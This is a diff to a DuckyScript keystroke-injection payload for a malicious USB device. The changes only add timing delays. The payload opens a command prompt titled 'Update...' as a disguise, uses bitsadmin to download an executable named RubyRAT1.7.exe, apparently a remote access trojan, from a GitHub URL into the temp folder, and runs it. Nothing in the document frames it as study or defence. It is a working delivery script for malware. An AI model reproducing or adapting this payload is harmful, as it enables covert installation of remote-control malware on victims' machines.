@@ -4,18 +4,31 @@ DELAY 1000
 GUI r
 DELAY 1500
 STRING cmd
+DELAY 500
 ENTER
+DELAY 2000
 STRING @echo off
+DELAY 500
 ENTER
+DELAY 500
 STRING title Update...
+DELAY 500
 ENTER
+DELAY 500
 STRING color f
+DELAY 500
 ENTER
+DELAY 500
 STRING set pOut="%temp%\\Output.exe"
+DELAY 500
 ENTER
+DELAY 500
 STRING bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/WilleLX1/F0_BK/blob/main/CustomRawHosters/RubyRAT1.7.exe" %pOut%
+DELAY 1000
 ENTER
+DELAY 500
 STRING start "" %pOut%
+DELAY 500
 ENTER
 DELAY 500
 ENTER
